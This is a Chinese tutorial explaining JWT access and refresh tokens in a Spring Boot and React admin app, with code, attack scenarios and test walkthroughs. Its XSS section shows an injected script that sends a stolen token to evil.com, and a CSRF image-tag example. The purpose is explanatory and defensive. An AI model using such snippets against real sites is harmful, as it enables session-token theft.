# JWT Token 和 Refresh Token 机制详解

## 📚 目录

1. [基础概念](#基础概念)
2. [为什么需要 Refresh Token](#为什么需要-refresh-token)
3. [完整的认证流程](#完整的认证流程)
4. [核心代码解析](#核心代码解析)
5. [安全机制详解](#安全机制详解)
6. [常见问题FAQ](#常见问题faq)
7. [实战演练](#实战演练)

---

## 基础概念

### 什么是 JWT (JSON Web Token)？

JWT 是一种开放标准（RFC 7519），用于在各方之间安全地传输信息。它由三部分组成：

```
Header.Payload.Signature
```

#### JWT 结构示例

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbXBJZCI6MSwiZXhwIjoxNjk5MTQwMDAwfQ.signature_here
```

**解码后的内容**:

```json
// Header (头部)
{
  "alg": "HS256",  // 签名算法
  "typ": "JWT"      // 类型
}

// Payload (负载 - 存储用户信息)
{
  "empId": 1,              // 员工ID
  "exp": 1699140000        // 过期时间戳
}

// Signature (签名 - 用于验证完整性)
// HMACSHA256(
//   base64UrlEncode(header) + "." + base64UrlEncode(payload),
//   secret_key
// )
```

### JWT 的特点

✅ **优点**:
- **无状态**: 服务器不需要存储 session，易于水平扩展
- **跨域友好**: 可以在不同域名之间传递
- **自包含**: Token 本身包含用户信息，减少数据库查询

❌ **缺点**:
- **无法主动失效**: JWT 签发后，在过期前一直有效（除非实现黑名单）
- **Token 体积较大**: 相比传统 session ID
- **安全性要求高**: 一旦泄露，攻击者可以使用直到过期

---

## 为什么需要 Refresh Token？

### 问题场景

假设我们只使用 Access Token（访问令牌）：

#### 方案A：长有效期 Access Token（如30天）

```
优点: 用户体验好，30天内无需重新登录
缺点:
  - Token 泄露后，攻击者可以使用 30 天
  - 安全风险极高
  - 无法有效控制用户权限变更
```

#### 方案B：短有效期 Access Token（如30分钟）

```
优点: Token 泄露后影响时间短，安全性高
缺点:
  - 用户每 30 分钟就要重新登录一次
  - 用户体验极差
```

### 解决方案：Access Token + Refresh Token

这是业界标准的解决方案，完美平衡了**安全性**和**用户体验**。

| Token 类型 | 有效期 | 用途 | 存储位置 |
|-----------|--------|------|---------|
| **Access Token** | 短（2小时） | 访问受保护的API资源 | 前端 localStorage / 后端不存储 |
| **Refresh Token** | 长（7天） | 刷新 Access Token | 前端 localStorage / 后端 Redis |

#### 工作原理

```
┌─────────────┐         ┌─────────────┐         ┌─────────────┐
│   前端      │         │  后端 API    │         │   Redis     │
└─────────────┘         └─────────────┘         └─────────────┘
       │                       │                       │
       │  1. 登录请求           │                       │
       ├──────────────────────>│                       │
       │                       │                       │
       │                       │  生成 Access Token    │
       │                       │  生成 Refresh Token   │
       │                       │                       │
       │                       │  存储 Refresh Token   │
       │                       ├──────────────────────>│
       │                       │                       │
       │  2. 返回两个 Token     │                       │
       │<──────────────────────┤                       │
       │  { token, refreshToken }                      │
       │                       │                       │
       │  3. 使用 Access Token 访问API（2小时内有效）  │
       ├──────────────────────>│                       │
       │<──────────────────────┤                       │
       │     返回数据            │                       │
       │                       │                       │
       │  4. Access Token 过期  │                       │
       ├─────────────x────────>│ 401 Unauthorized      │
       │                       │                       │
       │  5. 前端自动用 Refresh Token 刷新              │
       ├──────────────────────>│                       │
       │  { refreshToken }     │                       │
       │                       │                       │
       │                       │  验证 Refresh Token   │
       │                       ├──────────────────────>│
       │                       │  对比 Redis 中的值    │
       │                       │<──────────────────────┤
       │                       │                       │
       │  6. 返回新的 Access Token                     │
       │<──────────────────────┤                       │
       │  { token, refreshToken }                      │
       │                       │                       │
       │  7. 用新 Token 重试原请求                      │
       ├──────────────────────>│                       │
       │<──────────────────────┤                       │
       │     返回数据            │                       │
```

---

## 完整的认证流程

### 1️⃣ 用户登录流程

#### 前端代码 (Login.tsx)

```typescript
const handleSubmit = async (e: React.FormEvent) => {
  e.preventDefault();

  try {
    // 调用登录 API
    const response = await employeeLoginAPI(formData);

    // 保存两个 Token 到 localStorage
    localStorage.setItem("token", response.token);              // Access Token (2小时)
    localStorage.setItem("refreshToken", response.refreshToken); // Refresh Token (7天)

    // 保存用户信息
    localStorage.setItem("userName", response.userName);
    localStorage.setItem("name", response.name);
    localStorage.setItem("userId", response.id.toString());

    toast.success("登录成功");
    navigate("/dashboard");
  } catch (error) {
    toast.error("登录失败");
  }
};
```

#### 后端代码 (EmployeeController.java)

```java
@PostMapping("/login")
public Result<EmployeeLoginVO> login(@RequestBody EmployeeLoginDTO employeeLoginDTO) {
    // 1. 验证用户名和密码
    Employee employee = employeeService.login(employeeLoginDTO);

    // 2. 准备 JWT Claims (负载数据)
    Map<String, Object> claims = new HashMap<>();
    claims.put(JwtClaimsConstant.EMP_ID, employee.getId());

    // 3. 生成 Access Token（短期：2小时）
    String accessToken = JwtUtil.createJWT(
        jwtProperties.getAdminSecretKey(),    // 密钥
        jwtProperties.getAdminTtl(),          // 2小时 = 7200000ms
        claims
    );

    // 4. 生成 Refresh Token（长期：7天）
    String refreshToken = JwtUtil.createJWT(
        jwtProperties.getAdminSecretKey(),    // 使用相同密钥
        jwtProperties.getAdminRefreshTtl(),   // 7天 = 604800000ms
        claims
    );

    // 5. ⭐ 关键：将 Refresh Token 存储到 Redis
    // 为什么存 Redis？用于后续验证，防止伪造
    String redisKey = "refresh_token:" + employee.getId();
    redisTemplate.opsForValue().set(
        redisKey,
        refreshToken,
        jwtProperties.getAdminRefreshTtl(),  // 过期时间：7天
        TimeUnit.MILLISECONDS
    );

    log.info("员工 {} 登录成功，Refresh Token已存入Redis", employee.getUsername());

    // 6. 返回两个 Token 给前端
    EmployeeLoginVO employeeLoginVO = EmployeeLoginVO.builder()
        .id(employee.getId())
        .userName(employee.getUsername())
        .name(employee.getName())
        .token(accessToken)           // Access Token
        .refreshToken(refreshToken)   // Refresh Token
        .build();

    return Result.success(employeeLoginVO);
}
```

**关键点解析**:

1. **为什么 Refresh Token 也要存储到 Redis？**
   - 实现双重验证：JWT 签名验证 + Redis 存储验证
   - 防止伪造：即使有人破解了 JWT 签名算法，没有 Redis 中的对应记录也无法刷新
   - 方便管理：可以主动删除（如用户退出登录）

2. **为什么不把 Access Token 也存 Redis？**
   - Access Token 频繁使用，存 Redis 会增加网络开销
   - JWT 本身就是为了无状态设计，存 Redis 违背初衷
   - 2小时有效期已经足够短，安全风险可控

---

### 2️⃣ 访问受保护的API

#### 前端：自动添加 Token 到请求头

```typescript
// 请求拦截器 (request.ts)
instance.interceptors.request.use((config) => {
  const token = localStorage.getItem("token");
  if (token) {
    config.headers.token = token;  // 添加到请求头
  }
  return config;
});
```

#### 后端：JWT 拦截器验证

```java
// JwtTokenAdminInterceptor.java
@Override
public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) {
    // 1. 获取请求头中的 token
    String token = request.getHeader(jwtProperties.getAdminTokenName());

    if (token == null || token.trim().isEmpty()) {
        log.warn("JWT token为空");
        response.setStatus(401);
        return false;
    }

    try {
        // 2. 验证 JWT Token（验证签名和过期时间）
        Claims claims = JwtUtil.parseJWT(jwtProperties.getAdminSecretKey(), token);
        Long empId = Long.valueOf(claims.get(JwtClaimsConstant.EMP_ID).toString());

        log.info("当前员工id：{}", empId);

        // 3. 将用户ID存入 ThreadLocal，供后续使用
        BaseContext.setCurrentId(empId);
        return true;

    } catch (Exception ex) {
        log.warn("JWT token验证失败：{}", ex.getMessage());
        response.setStatus(401);
        return false;
    }
}

@Override
public void afterCompletion(HttpServletRequest request, HttpServletResponse response,
                           Object handler, Exception ex) {
    // 清理 ThreadLocal，防止内存泄漏
    BaseContext.removeCurrentId();
}
```

---

### 3️⃣ Token 过期自动刷新

#### 前端：响应拦截器自动处理 401

```typescript
// request.ts
instance.interceptors.response.use(
  (response) => response.data,
  async (error: AxiosError) => {
    const originalRequest = error.config as InternalAxiosRequestConfig & { _retry?: boolean };

    // 处理 401 错误：Token 过期
    if (error.response?.status === 401 && originalRequest && !originalRequest._retry) {

      // ⭐ 防止无限循环：标记已重试
      originalRequest._retry = true;

      // ⭐ 防止多个请求同时刷新
      if (isRefreshing) {
        // 将请求加入队列，等待刷新完成
        return new Promise((resolve, reject) => {
          failedQueue.push({ resolve, reject });
        })
        .then((newToken) => {
          originalRequest.headers.token = newToken as string;
          return instance(originalRequest);  // 重试请求
        });
      }

      isRefreshing = true;

      try {
        // 1. 调用刷新接口
        const newToken = await refreshAccessToken();

        if (newToken) {
          // 2. 刷新成功：处理等待队列
          processQueue(null, newToken);

          // 3. 更新原请求的 token 并重试
          originalRequest.headers.token = newToken;
          return instance(originalRequest);

        } else {
          // 刷新失败：跳转登录页
          processQueue(new Error("Token 刷新失败"), null);
          toast.warning("登录过期，现在跳转到登录页");
          handleTokenExpired();
        }
      } finally {
        isRefreshing = false;
      }
    }

    return Promise.reject(error);
  }
);
```

#### 刷新 Token 函数

```typescript
const refreshAccessToken = async (): Promise<string | null> => {
  try {
    // 1. 从 localStorage 获取 Refresh Token
    const refreshToken = localStorage.getItem("refreshToken");

    if (!refreshToken) {
      console.warn("没有 refresh token，无法刷新");
      return null;
    }

    // 2. 调用后端刷新接口（不使用 instance，避免触发拦截器）
    const response = await axios.post("/api/admin/employee/refresh", {
      refreshToken
    });

    if (response.data.code === 1) {
      const newToken = response.data.data.token;
      const newRefreshToken = response.data.data.refreshToken;

      // 3. 更新 localStorage
      localStorage.setItem("token", newToken);
      localStorage.setItem("refreshToken", newRefreshToken);

      console.log("Token 刷新成功");
      return newToken;
    }

    return null;
  } catch (error) {
    console.error("刷新 token 失败:", error);
    return null;
  }
};
```

#### 后端：刷新接口实现

```java
@PostMapping("/refresh")
public Result<RefreshTokenVO> refreshToken(@RequestBody RefreshTokenDTO refreshTokenDTO) {
    try {
        String refreshToken = refreshTokenDTO.getRefreshToken();

        // 1. 验证 Refresh Token 的签名和有效期
        Claims claims = JwtUtil.parseJWT(jwtProperties.getAdminSecretKey(), refreshToken);
        Long empId = Long.valueOf(claims.get(JwtClaimsConstant.EMP_ID).toString());

        log.info("收到Token刷新请求，员工ID：{}", empId);

        // 2. ⭐ 从 Redis 获取存储的 Refresh Token，进行二次验证
        String redisKey = "refresh_token:" + empId;
        String storedRefreshToken = redisTemplate.opsForValue().get(redisKey);

        if (storedRefreshToken == null) {
            log.warn("Redis中未找到Refresh Token，员工ID：{}", empId);
            return Result.error("Refresh Token已失效，请重新登录");
        }

        // 3. 对比前端传来的 Refresh Token 和 Redis 中的是否一致
        if (!refreshToken.equals(storedRefreshToken)) {
            log.warn("Refresh Token不匹配，员工ID：{}", empId);
            return Result.error("Refresh Token无效，请重新登录");
        }

        // 4. 验证通过，生成新的 Access Token
        Map<String, Object> newClaims = new HashMap<>();
        newClaims.put(JwtClaimsConstant.EMP_ID, empId);

        String newAccessToken = JwtUtil.createJWT(
            jwtProperties.getAdminSecretKey(),
            jwtProperties.getAdminTtl(),  // 2小时
            newClaims
        );

        log.info("Token刷新成功，员工ID：{}", empId);

        // 5. 返回新的 Access Token（Refresh Token 保持不变）
        RefreshTokenVO refreshTokenVO = RefreshTokenVO.builder()
            .token(newAccessToken)
            .refreshToken(refreshToken)  // 原 Refresh Token 不变
            .build();

        return Result.success(refreshTokenVO);

    } catch (Exception e) {
        log.error("刷新Token失败：{}", e.getMessage());
        return Result.error("Refresh Token无效或已过期，请重新登录");
    }
}
```

**关键点**:

1. **为什么 Refresh Token 不变？**
   - 避免频繁更新 Redis
   - 简化前端逻辑
   - 7天有效期已经足够长

2. **双重验证的意义**
   - JWT 签名验证：确保 token 没有被篡改
   - Redis 对比验证：确保 token 没有被伪造，且用户未退出登录

---

### 4️⃣ 用户退出登录

#### 前端代码

```typescript
export const employeeLogoutAPI = async (): Promise<void> => {
  try {
    // 调用后端退出接口
    await request.post("/employee/logout");
  } catch (error) {
    console.error("退出登录接口调用失败:", error);
  } finally {
    // 清除本地所有 Token 和用户信息
    localStorage.removeItem("token");
    localStorage.removeItem("refreshToken");
    localStorage.removeItem("userName");
    localStorage.removeItem("name");
    localStorage.removeItem("userId");
  }
};
```

#### 后端代码

```java
@PostMapping("/logout")
public Result<String> logout() {
    try {
        // 1. 从 ThreadLocal 获取当前登录用户的 ID
        Long empId = BaseContext.getCurrentId();

        if (empId != null) {
            // 2. 删除 Redis 中的 Refresh Token
            String redisKey = "refresh_token:" + empId;
            Boolean deleted = redisTemplate.delete(redisKey);

            if (Boolean.TRUE.equals(deleted)) {
                log.info("员工 {} 已退出登录，Refresh Token已从Redis清除", empId);
            } else {
                log.warn("员工 {} 退出登录，但Redis中未找到Refresh Token", empId);
            }
        }

        return Result.success();
    } catch (Exception e) {
        log.error("退出登录时发生错误：{}", e.getMessage());
        return Result.success();  // 即使出错也返回成功，让前端清除本地 token
    }
}
```

**注意事项**:

- **Access Token 无法主动失效**：由于 JWT 是无状态的，退出登录后，Access Token 在过期前（2小时）仍然有效
- **Refresh Token 立即失效**：从 Redis 删除后，无法再刷新 Access Token
- **如何增强安全性**：可以实现 Token 黑名单机制（将退出的 Access Token 加入 Redis 黑名单）

---

## 核心代码解析

### JWT 工具类 (JwtUtil.java)

```java
public class JwtUtil {

    /**
     * 创建 JWT Token
     *
     * @param secretKey 密钥（必须足够长，建议 256 位以上）
     * @param ttlMillis 过期时间（毫秒）
     * @param claims    负载数据（用户信息）
     * @return JWT Token 字符串
     */
    public static String createJWT(String secretKey, long ttlMillis, Map<String, Object> claims) {
        // 1. 计算过期时间
        long expMillis = System.currentTimeMillis() + ttlMillis;
        Date exp = new Date(expMillis);

        // 2. 创建签名密钥
        SecretKey key = Keys.hmacShaKeyFor(secretKey.getBytes(StandardCharsets.UTF_8));

        // 3. 构建 JWT
        return Jwts.builder()
                .claims(claims)           // 设置负载（用户信息）
                .signWith(key)            // 使用密钥签名
                .expiration(exp)          // 设置过期时间
                .compact();               // 生成最终的 JWT 字符串
    }

    /**
     * 解析并验证 JWT Token
     *
     * @param secretKey 密钥（必须与创建时一致）
     * @param token     JWT Token 字符串
     * @return Claims（负载数据）
     * @throws JwtException 如果 token 无效、过期或被篡改
     */
    public static Claims parseJWT(String secretKey, String token) {
        // 1. 创建签名密钥
        SecretKey key = Keys.hmacShaKeyFor(secretKey.getBytes(StandardCharsets.UTF_8));

        // 2. 解析并验证 JWT
        return Jwts.parser()
                .verifyWith(key)          // 验证签名
                .build()
                .parseSignedClaims(token) // 解析 token（如果过期或签名错误会抛出异常）
                .getPayload();            // 返回负载数据
    }
}
```

**工作原理**:

```
创建 JWT:
  输入: { empId: 1, exp: 1699140000 }
    ↓
  编码为 Base64
    ↓
  使用密钥签名
    ↓
  生成: eyJhbGc...header.eyJlbX...payload.SflKxw...signature

验证 JWT:
  输入: eyJhbGc...header.eyJlbX...payload.SflKxw...signature
    ↓
  使用密钥验证签名
    ↓
  签名有效？
    ├─ 是 → 检查过期时间
    │          ├─ 未过期 → 返回 Claims
    │          └─ 已过期 → 抛出异常
    └─ 否 → 抛出异常（token被篡改）
```

---

### ThreadLocal 上下文管理 (BaseContext.java)

```java
public class BaseContext {
    // 使用 ThreadLocal 存储当前线程的用户ID
    public static ThreadLocal<Long> threadLocal = new ThreadLocal<>();

    /**
     * 设置当前用户ID
     * 在 JWT 拦截器验证成功后调用
     */
    public static void setCurrentId(Long id) {
        threadLocal.set(id);
    }

    /**
     * 获取当前用户ID
     * 在 Service 层业务逻辑中使用
     */
    public static Long getCurrentId() {
        return threadLocal.get();
    }

    /**
     * 清理 ThreadLocal
     * 在请求处理完成后必须调用，防止内存泄漏
     */
    public static void removeCurrentId() {
        threadLocal.remove();
    }
}
```

**为什么使用 ThreadLocal？**

```
┌──────────────────────────────────────────┐
│  Tomcat 线程池（多个线程同时处理请求）     │
├──────────────────────────────────────────┤
│  Thread-1: 处理用户A的请求 (empId=1)      │
│  Thread-2: 处理用户B的请求 (empId=2)      │
│  Thread-3: 处理用户C的请求 (empId=3)      │
└──────────────────────────────────────────┘

如果使用全局变量:
  empId = 1  (用户A)
  empId = 2  (用户B，覆盖了用户A)
  empId = 3  (用户C，覆盖了用户B)
  → 数据混乱！

使用 ThreadLocal:
  Thread-1.empId = 1  (用户A)
  Thread-2.empId = 2  (用户B)
  Thread-3.empId = 3  (用户C)
  → 每个线程独立存储，互不影响
```

**使用示例**:

```java
// 在拦截器中设置
@Override
public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) {
    Claims claims = JwtUtil.parseJWT(secretKey, token);
    Long empId = Long.valueOf(claims.get(JwtClaimsConstant.EMP_ID).toString());

    // 存入 ThreadLocal
    BaseContext.setCurrentId(empId);
    return true;
}

// 在 Service 层使用
public void updateEmployee(EmployeeDTO dto) {
    Employee employee = EmployeeConverter.INSTANCE.d2e(dto);

    // 获取当前登录用户的 ID
    Long currentUserId = BaseContext.getCurrentId();
    employee.setUpdateUser(currentUserId);
    employee.setUpdateTime(LocalDateTime.now());

    updateById(employee);
}

// 在拦截器结束时清理
@Override
public void afterCompletion(HttpServletRequest request, HttpServletResponse response,
                           Object handler, Exception ex) {
    // 必须清理，防止内存泄漏
    BaseContext.removeCurrentId();
}
```

---

## 安全机制详解

### 1. 双重验证机制

| 验证步骤 | 验证内容 | 防止的攻击 |
|---------|---------|-----------|
| **第一重：JWT 签名验证** | 验证 token 的签名是否有效 | 防止 token 被篡改 |
| **第二重：Redis 对比验证** | 验证 token 是否存在于 Redis 中 | 防止 token 被伪造、用户已退出 |

#### 攻击场景分析

**场景1：攻击者伪造 Token**

```
攻击者: 我自己构造一个 JWT
  { "empId": 1, "exp": 9999999999 }
  编码 → eyJlbX...fake_token

后端验证:
  ❌ 签名验证失败 → 拒绝访问
  原因: 攻击者不知道 secretKey，无法生成正确的签名
```

**场景2：攻击者窃取了真实的 Access Token**

```
攻击者: 截获了真实的 Access Token

后端验证:
  ✅ 签名验证通过
  ✅ 过期时间未到（2小时内）
  → 攻击者可以访问（影响时间：最多2小时）

防御措施:
  - 使用 HTTPS 加密传输，防止窃取
  - 缩短 Access Token 有效期
  - 实现 Token 黑名单（高级）
```

**场景3：攻击者窃取了 Refresh Token**

```
攻击者: 截获了真实的 Refresh Token

后端验证（刷新接口）:
  ✅ 签名验证通过
  ✅ Redis 对比验证通过
  → 攻击者可以刷新获取新的 Access Token（影响时间：最多7天）

防御措施:
  1. 用户退出登录 → Redis 中的 Refresh Token 被删除 → 攻击者无法再刷新
  2. 检测到异常登录 → 强制删除 Redis 中的 Refresh Token
  3. 实现设备绑定（高级）
```

---

### 2. 防止常见攻击

#### XSS (跨站脚本攻击)

**攻击方式**: 注入恶意 JavaScript 代码，窃取 localStorage 中的 token

```javascript
// 攻击者注入的恶意代码
<script>
  const token = localStorage.getItem('token');
  fetch('http://evil.com/steal?token=' + token);  // 窃取 token
</script>
```

**防御措施**:

```typescript
// 1. 使用 HttpOnly Cookie 存储 token（推荐，但本项目使用 localStorage）
// 2. 对用户输入进行严格的转义和过滤
import DOMPurify from 'dompurify';

const sanitizedInput = DOMPurify.sanitize(userInput);

// 3. 设置 Content-Security-Policy 响应头
// CSP: default-src 'self'; script-src 'self' 'nonce-xxx'
```

#### CSRF (跨站请求伪造)

**攻击方式**: 诱导用户访问恶意网站，利用用户的 cookie 发起请求

```html
<!-- 攻击者的恶意网站 -->
<img src="http://your-app.com/api/admin/employee/delete?id=1" />
```

**防御措施**:

```java
// 本项目使用 JWT Token 在请求头中，而非 Cookie
// 浏览器不会自动在跨域请求中携带自定义请求头，天然防御 CSRF

// 但如果使用 Cookie 存储，需要：
// 1. 检查 Referer 头
// 2. 使用 CSRF Token
// 3. 设置 Cookie 的 SameSite 属性
```

#### 中间人攻击 (MITM)

**攻击方式**: 攻击者在网络传输过程中截获 token

**防御措施**:

```
✅ 必须使用 HTTPS
✅ 启用 HSTS (HTTP Strict Transport Security)
✅ 证书锁定 (Certificate Pinning)
```

---

### 3. Token 泄露后的影响时间

| Token 类型 | 泄露后影响时间 | 如何降低影响 |
|-----------|---------------|-------------|
| **Access Token** | 最多 2 小时 | 1. 缩短有效期<br>2. 实现 Token 黑名单<br>3. 检测异常行为 |
| **Refresh Token** | 最多 7 天 | 1. 用户主动退出登录<br>2. 检测异常刷新行为<br>3. 实现设备绑定 |

---

## 常见问题FAQ

### Q1: 为什么不把 Access Token 也存到 Redis？

**A**:
- **性能考虑**: Access Token 每次 API 请求都要验证，存 Redis 会增加网络开销
- **设计理念**: JWT 本身就是为了无状态设计，存 Redis 违背初衷
- **安全性**: 2小时有效期已经足够短，即使泄露影响也有限

### Q2: 为什么 Refresh Token 不刷新自己？

**A**:
- **简化逻辑**: 避免频繁更新 Redis
- **安全性**: 如果每次刷新都更新 Refresh Token，攻击者可以无限续期
- **推荐做法**: 实现 Refresh Token 轮转（Rotation）机制（高级）

```java
// Refresh Token 轮转示例（高级）
@PostMapping("/refresh")
public Result<RefreshTokenVO> refreshToken(@RequestBody RefreshTokenDTO dto) {
    // ... 验证 ...

    // 生成新的 Refresh Token
    String newRefreshToken = JwtUtil.createJWT(
        jwtProperties.getAdminSecretKey(),
        jwtProperties.getAdminRefreshTtl(),
        claims
    );

    // 更新 Redis
    redisTemplate.opsForValue().set(redisKey, newRefreshToken, ttl, TimeUnit.MILLISECONDS);

    // 返回新的 Refresh Token
    return Result.success(RefreshTokenVO.builder()
        .token(newAccessToken)
        .refreshToken(newRefreshToken)  // 新的 Refresh Token
        .build());
}
```

### Q3: 如何实现 Token 黑名单？

**A**: 在用户退出登录时，将 Access Token 加入 Redis 黑名单

```java
// 退出登录时
@PostMapping("/logout")
public Result<String> logout(HttpServletRequest request) {
    Long empId = BaseContext.getCurrentId();
    String token = request.getHeader(jwtProperties.getAdminTokenName());

    // 1. 计算 token 的剩余有效时间
    Claims claims = JwtUtil.parseJWT(jwtProperties.getAdminSecretKey(), token);
    Date expiration = claims.getExpiration();
    long ttl = expiration.getTime() - System.currentTimeMillis();

    if (ttl > 0) {
        // 2. 将 Access Token 加入黑名单
        redisTemplate.opsForValue().set(
            "token_blacklist:" + token,
            "1",
            ttl,
            TimeUnit.MILLISECONDS
        );
    }

    // 3. 删除 Refresh Token
    redisTemplate.delete("refresh_token:" + empId);

    return Result.success();
}

// JWT 拦截器中检查黑名单
@Override
public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) {
    String token = request.getHeader(jwtProperties.getAdminTokenName());

    // 检查黑名单
    Boolean isBlacklisted = redisTemplate.hasKey("token_blacklist:" + token);
    if (Boolean.TRUE.equals(isBlacklisted)) {
        log.warn("token已被注销");
        response.setStatus(401);
        return false;
    }

    // ... 其他验证 ...
}
```

### Q4: 多设备登录如何处理？

**A**: 根据业务需求选择策略

#### 策略1：允许多设备同时登录

```java
// 修改 Redis Key，加入设备标识
String redisKey = "refresh_token:" + empId + ":" + deviceId;
```

#### 策略2：新设备登录踢掉旧设备

```java
@PostMapping("/login")
public Result<EmployeeLoginVO> login(@RequestBody EmployeeLoginDTO dto) {
    // ... 验证 ...

    // 删除旧的 Refresh Token（踢掉旧设备）
    String pattern = "refresh_token:" + empId + ":*";
    Set<String> keys = redisTemplate.keys(pattern);
    if (keys != null && !keys.isEmpty()) {
        redisTemplate.delete(keys);
    }

    // 存储新的 Refresh Token
    String redisKey = "refresh_token:" + empId + ":" + deviceId;
    redisTemplate.opsForValue().set(redisKey, refreshToken, ttl, TimeUnit.MILLISECONDS);

    // ...
}
```

### Q5: 如何检测异常登录？

**A**: 记录用户的登录信息并检测异常行为

```java
// 登录时记录设备信息
@PostMapping("/login")
public Result<EmployeeLoginVO> login(@RequestBody EmployeeLoginDTO dto, HttpServletRequest request) {
    // ... 验证 ...

    // 记录登录信息
    LoginRecord record = LoginRecord.builder()
        .empId(empId)
        .ip(getClientIp(request))
        .userAgent(request.getHeader("User-Agent"))
        .loginTime(LocalDateTime.now())
        .build();

    loginRecordService.save(record);

    // 检测异常（示例）
    List<LoginRecord> recentLogins = loginRecordService.getRecentLogins(empId, 5);
    if (hasAbnormalBehavior(recentLogins)) {
        // 发送警告通知
        notificationService.sendSecurityAlert(empId, "检测到异常登录");
    }

    // ...
}

// 获取真实 IP
private String getClientIp(HttpServletRequest request) {
    String ip = request.getHeader("X-Forwarded-For");
    if (ip == null || ip.isEmpty() || "unknown".equalsIgnoreCase(ip)) {
        ip = request.getHeader("X-Real-IP");
    }
    if (ip == null || ip.isEmpty() || "unknown".equalsIgnoreCase(ip)) {
        ip = request.getRemoteAddr();
    }
    return ip;
}
```

---

## 实战演练

### 场景1：测试 Token 自动刷新

#### 步骤1：修改 Access Token 有效期为 30 秒

```yaml
# application.yml
firmament:
  jwt:
    admin-ttl: 30000  # 30秒，方便测试
```

#### 步骤2：启动项目并登录

```bash
# 启动后端
cd back-springboot/firmament-server
mvn spring-boot:run

# 启动前端
cd front-react
npm run dev
```

#### 步骤3：观察自动刷新

1. 登录系统
2. 打开浏览器控制台 → Network 面板
3. 等待 30 秒后，点击任意需要认证的功能（如查询员工列表）
4. 观察 Network 面板：

```
请求序列:
1. GET /admin/employee/page  → 401 Unauthorized
2. POST /admin/employee/refresh  → 200 OK (返回新 token)
3. GET /admin/employee/page  → 200 OK (使用新 token 重试)
```

5. 查看控制台日志：

```
Token 刷新成功
```

6. 查看 localStorage：

```javascript
localStorage.getItem('token')  // 新的 Access Token
localStorage.getItem('refreshToken')  // 原 Refresh Token
```

---

### 场景2：测试退出登录后 Refresh Token 失效

#### 步骤1：登录并记录 Refresh Token

```javascript
// 浏览器控制台
const refreshToken = localStorage.getItem('refreshToken');
console.log('Refresh Token:', refreshToken);
```

#### 步骤2：退出登录

点击退出登录按钮

#### 步骤3：尝试使用旧的 Refresh Token 刷新

```javascript
// 浏览器控制台
fetch('/api/admin/employee/refresh', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ refreshToken: refreshToken })
})
.then(res => res.json())
.then(data => console.log(data));

// 预期结果:
// { code: 0, msg: "Refresh Token已失效，请重新登录" }
```

---

### 场景3：测试并发请求的 Token 刷新

#### 模拟场景

同时发起多个 API 请求，且 Access Token 已过期

#### 前端代码测试

```typescript
// 浏览器控制台
// 1. 手动清除 Access Token（模拟过期）
localStorage.removeItem('token');

// 2. 同时发起 3 个请求
Promise.all([
  fetch('/api/admin/employee/page'),
  fetch('/api/admin/dish/page'),
  fetch('/api/admin/order/page')
])
.then(results => console.log('All requests completed:', results));
```

#### 预期行为

```
Network 面板:
1. GET /admin/employee/page  → 401
2. GET /admin/dish/page  → 401
3. GET /admin/order/page  → 401
4. POST /admin/employee/refresh  → 200 (只刷新一次！)
5. GET /admin/employee/page  → 200 (重试成功)
6. GET /admin/dish/page  → 200 (重试成功)
7. GET /admin/order/page  → 200 (重试成功)
```

**关键点**: 虽然 3 个请求都失败了，但只触发了 1 次刷新（通过请求队列实现）

---

### 场景4：测试 MD5 密码自动升级

#### 步骤1：在数据库中插入 MD5 密码的测试用户

```sql
-- MD5("123456") = e10adc3949ba59abbe56e057f20f883e
INSERT INTO employee (name, username, password, phone, sex, id_number, status, create_time, update_time, create_user, update_user)
VALUES ('测试员工', 'test_md5', 'e10adc3949ba59abbe56e057f20f883e', '13800138000', '1', '110000199001011234', 1, NOW(), NOW(), 1, 1);
```

#### 步骤2：使用该用户登录

```
用户名: test_md5
密码: 123456
```

#### 步骤3：查看后端日志

```
检测到员工 test_md5 使用MD5密码，正在自动升级为BCrypt加密
员工 test_md5 的密码已成功升级为BCrypt加密格式
```

#### 步骤4：查看数据库

```sql
SELECT password FROM employee WHERE username = 'test_md5';

-- 密码已变为 BCrypt 格式:
-- {BCRYPT}$2a$10$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

#### 步骤5：再次登录

使用相同的用户名和密码登录，应该直接使用 BCrypt 验证，不再有升级日志

---

## 总结

### 核心要点

1. **Access Token (2小时)**
   - 用于访问受保护的 API
   - 无状态，不存储在服务器
   - 过期后需要刷新

2. **Refresh Token (7天)**
   - 用于刷新 Access Token
   - 存储在 Redis 中
   - 退出登录时立即失效

3. **双重验证机制**
   - JWT 签名验证（防篡改）
   - Redis 对比验证（防伪造）

4. **自动刷新机制**
   - 前端自动捕获 401 错误
   - 使用 Refresh Token 获取新的 Access Token
   - 自动重试原请求

5. **安全最佳实践**
   - 使用 HTTPS 传输
   - 使用 BCrypt 加密密码
   - 实现 Token 黑名单（可选）
   - 记录登录日志，检测异常行为

---

### 学习路径建议

1. **初学者**：理解基础概念和流程
2. **进阶**：实现 Token 黑名单、多设备管理
3. **高级**：实现 Refresh Token 轮转、设备指纹、异常检测

---

### 参考资料

- [RFC 7519 - JWT 标准](https://datatracker.ietf.org/doc/html/rfc7519)
- [OWASP - Token Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [Spring Security - JWT Authentication](https://spring.io/guides/tutorials/spring-boot-oauth2/)

---

**文档版本**: 1.0
**创建日期**: 2025年
**维护者**: Cangqiong Project Team
**最后更新**: 2025年
